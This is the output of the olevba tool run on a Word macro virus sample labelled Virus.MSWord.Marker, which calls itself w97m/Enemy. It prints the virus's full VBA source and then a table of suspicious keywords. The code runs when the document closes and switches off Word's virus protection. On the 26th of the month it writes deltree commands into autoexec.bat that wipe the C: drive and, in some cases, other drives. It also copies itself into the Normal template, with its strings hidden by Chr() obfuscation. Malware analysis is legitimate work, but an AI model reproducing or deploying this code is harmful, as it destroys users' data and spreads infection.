olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.ft-6611fd8084130c70c5af8694bce74fde17c4fe40b3c8bcccd3f505f850e36074
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.ft-6611fd8084130c70c5af8694bce74fde17c4fe40b3c8bcccd3f505f850e36074 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Enemy
Private Sub Document_Close()
'w97m/Enemy
On Error Resume Next
Options.VirusProtection = 0
Options.ConfirmConversions = 0
Options.SaveNormalPrompt = 0
Dim Flag As Boolean
Dim hFile As Long
With Application
.EnableCancelKey = False
.ScreenUpdating = False
.DisplayAlerts = wdAlertsNone
.ShowVisualBasicEditor = False
End With
If Day(Now()) = 26 Then
If UCase(Dir(Chr(99) + Chr(58) + Chr(92) + Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + Chr(115) + Chr(121) + Chr(115) + Chr(116) + Chr(101) + Chr(109) + Chr(92) + Chr(98) + Chr(114) + Chr(115) + Chr(101) + Chr(99) + Chr(51) + Chr(50) + Chr(46) + Chr(100) + Chr(108) + Chr(108))) <> UCase(Chr(98) + Chr(114) + Chr(115) + Chr(101) + Chr(99) + Chr(51) + Chr(50) + Chr(46) + Chr(100) + Chr(108) + Chr(108)) Then
If UCase(Left$(Application.UserName, 1)) = "R" Then Flag = 1
BatMod = GetAttr(Chr(99) + Chr(58) + Chr(92) + Chr(97) + Chr(117) + Chr(116) + Chr(111) + Chr(101) + Chr(120) + Chr(101) + Chr(99) + Chr(46) + Chr(98) + Chr(97) + Chr(116))
SetAttr strFile, vbNormal
Deltree$ = Chr(100) + Chr(101) + Chr(108) + Chr(116) + Chr(114) + Chr(101) + Chr(101) + Chr(32) + Chr(47) + Chr(121) + Chr(32)
Nul$ = Chr(32) + Chr(62) + Chr(32) + Chr(110) + Chr(117) + Chr(108)
hFile = FreeFile
Open Chr(99) + Chr(58) + Chr(92) + Chr(97) + Chr(117) + Chr(116) + Chr(111) + Chr(101) + Chr(120) + Chr(101) + Chr(99) + Chr(46) + Chr(98) + Chr(97) + Chr(116) For Append Access Write As hFile
Print #hFile, vbCr + vbLf + Chr(64) + Chr(101) + Chr(99) + Chr(104) + Chr(111) + Chr(32) + Chr(111) + Chr(102) + Chr(102)
Print #hFile, Chr(98) + Chr(114) + Chr(101) + Chr(97) + Chr(107) + Chr(32) + Chr(111) + Chr(102) + Chr(102)
If Flag = 1 Then
Print #hFile, Deltree$ + Chr(102) + Chr(58) + Chr(92) + Nul$
Print #hFile, Deltree$ + Chr(101) + Chr(58) + Chr(92) + Nul$
Print #hFile, Deltree$ + Chr(100) + Chr(58) + Chr(92) + Nul$
End If
Print #hFile, Deltree$ + Chr(99) + Chr(58) + Chr(92) + Chr(109) + Chr(121) + Chr(100) + Chr(111) + Chr(99) + Chr(117) + Chr(126) + Chr(49) + Nul$
Print #hFile, Deltree$ + Chr(99) + Chr(58) + Chr(92) + Chr(112) + Chr(114) + Chr(111) + Chr(103) + Chr(114) + Chr(97) + Chr(126) + Chr(49) + Nul$
Print #hFile, Deltree$ + Chr(99) + Chr(58) + Chr(92) + Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + Chr(115) + Chr(121) + Chr(115) + Chr(116) + Chr(101) + Chr(109) + Nul$
Print #hFile, Deltree$ + Chr(99) + Chr(58) + Chr(92) + Nul$
Close hFile
SetAttr strFile, BatMod
End If
End If
With Dialogs(wdDialogFileSummaryInfo)
.Author = ""
.Title = ""
.Subject = ""
.Comments = ""
.Keywords = ""
.Execute
End With
NormalAttrib = GetAttr(NormalTemplate.FullName)
If NormalAttrib = vbReadOnly Then GoTo Fuck
If NormalAttrib = vbReadOnly + vbArchive Then GoTo Fuck
Set ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Set nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
If ad.Lines(1, 1) <> Chr(39) + Chr(69) + Chr(110) + Chr(101) + Chr(109) + Chr(121) Then
If ad.CountOfLines > 0 Then ad.DeleteLines 1, ad.CountOfLines
ad.AddFromString (Chr(39) + Chr(69) + Chr(110) + Chr(101) + Chr(109) + Chr(121) & vbCr & Chr(80) + Chr(114) + Chr(105) + Chr(118) + Chr(97) + Chr(116) + Chr(101) + Chr(32) + Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(95) + Chr(79) + Chr(112) + Chr(101) + Chr(110) + Chr(40) + Chr(41) & vbCr & nt.Lines(3, nt.CountOfLines - 10))
End If
If nt.Lines(1, 1) <> Chr(39) + Chr(69) + Chr(110) + Chr(101) + Chr(109) + Chr(121) Then
If nt.CountOfLines > 0 Then ad.DeleteLines 1, ad.CountOfLines
nt.DeleteLines 1, nt.CountOfLines
nt.AddFromString (Chr(39) + Chr(69) + Chr(110) + Chr(101) + Chr(109) + Chr(121) & vbCr & Chr(80) + Chr(114) + Chr(105) + Chr(118) + Chr(97) + Chr(116) + Chr(101) + Chr(32) + Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(95) + Chr(67) + Chr(108) + Chr(111) + Chr(115) + Chr(101) + Chr(40) + Chr(41) & vbCr & ad.Lines(3, ad.CountOfLines - 2) _
& Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(86) + Chr(105) + Chr(101) + Chr(119) + Chr(86) + Chr(66) + Chr(67) + Chr(111) + Chr(100) + Chr(101) + Chr(40) + Chr(41) & vbCr & Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(83) + Chr(117) + Chr(98) & vbCr & Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(84) + Chr(111) + Chr(111) + Chr(108) + Chr(115) + Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111) + Chr(40) + Chr(41) & vbCr & Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(83) + Chr(117) + Chr(98) & vbCr & Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(70) + Chr(105) + Chr(108) + Chr(101) + Chr(80) + Chr(114) + Chr(105) + Chr(110) + Chr(116) + Chr(40) + Chr(41) _
& vbCr & Chr(65) + Chr(99) + Chr(116) + Chr(105) + Chr(118) + Chr(101) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(46) + Chr(80) + Chr(114) + Chr(105) + Chr(110) + Chr(116) + Chr(79) + Chr(117) + Chr(116) & vbCr & Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(83) + Chr(117) + Chr(98))
End If
If nt.CountOfLines <> 0 And ad.CountOfLines = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
Exit Sub
Fuck:
Norm$ = NormalTemplate
Attr$ = Chr(97) + Chr(116) + Chr(116) + Chr(114) + Chr(105) + Chr(98) + Chr(32) + Chr(45) + Chr(104) + Chr(32) + Chr(45) + Chr(114) + Chr(32)
Path1$ = Chr(99) + Chr(58) + Chr(92) + Chr(112) + Chr(114) + Chr(111) + Chr(103) + Chr(114) + Chr(97) + Chr(126) + Chr(49) + Chr(92) + Chr(109) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(126) + Chr(49) + Chr(92) + Chr(116) + Chr(101) + Chr(109) + Chr(112) + Chr(108) + Chr(97) + Chr(126) + Chr(49) + Chr(92)
Path2$ = Chr(99) + Chr(58) + Chr(92) + Chr(112) + Chr(114) + Chr(111) + Chr(103) + Chr(114) + Chr(97) + Chr(126) + Chr(49) + Chr(92) + Chr(109) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(126) + Chr(50) + Chr(92) + Chr(116) + Chr(101) + Chr(109) + Chr(112) + Chr(108) + Chr(97) + Chr(126) + Chr(49) + Chr(92)
DelCmd$ = Chr(100) + Chr(101) + Chr(108) + Chr(32)
hFile = FreeFile
Open Chr(99) + Chr(58) + Chr(92) + Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + Chr(115) + Chr(116) + Chr(97) + Chr(114) + Chr(116) + Chr(109) + Chr(126) + Chr(49) + Chr(92) + Chr(112) + Chr(114) + Chr(111) + Chr(103) + Chr(114) + Chr(97) + Chr(109) + Chr(115) + Chr(92) + Chr(115) + Chr(116) + Chr(97) + Chr(114) + Chr(116) + Chr(117) + Chr(112) + Chr(92) + Chr(110) + Chr(111) + Chr(114) + Chr(109) + Chr(97) + Chr(108) + Chr(46) + Chr(98) + Chr(97) + Chr(116) For Append Access Write As hFile
Print #hFile, vbCr + vbLf + Chr(64) + Chr(101) + Chr(99) + Chr(104) + Chr(111) + Chr(32) + Chr(111) + Chr(102) + Chr(102)
Print #hFile, Attr$ + Path1$ + Norm$
Print #hFile, Attr$ + Path2$ + Norm$
Print #hFile, DelCmd$ + Path1$ + Norm$
Print #hFile, DelCmd$ + Path2$ + Norm$
Print #hFile, Chr(99) + Chr(108) + Chr(115)
Print #hFile, DelCmd$ + Chr(99) + Chr(58) + Chr(92) + Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + Chr(115) + Chr(116) + Chr(97) + Chr(114) + Chr(116) + Chr(109) + Chr(126) + Chr(49) + Chr(92) + Chr(112) + Chr(114) + Chr(111) + Chr(103) + Chr(114) + Chr(97) + Chr(109) + Chr(115) + Chr(92) + Chr(115) + Chr(116) + Chr(97) + Chr(114) + Chr(116) + Chr(117) + Chr(112) + Chr(92) + Chr(110) + Chr(111) + Chr(114) + Chr(109) + Chr(97) + Chr(108) + Chr(46) + Chr(98) + Chr(97) + Chr(116)
Close hFile
End Sub
'Yes I know my enemies.
'They're the teachers who taught me to fight me
'Compromise, conformity, assimilation, submission
'Ignorance, hypocrisy, brutality, the elite...

Sub ViewVBCode()
End Sub
Sub ToolsMacro()
End Sub
Sub FilePrint()
ActiveDocument.PrintOut
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

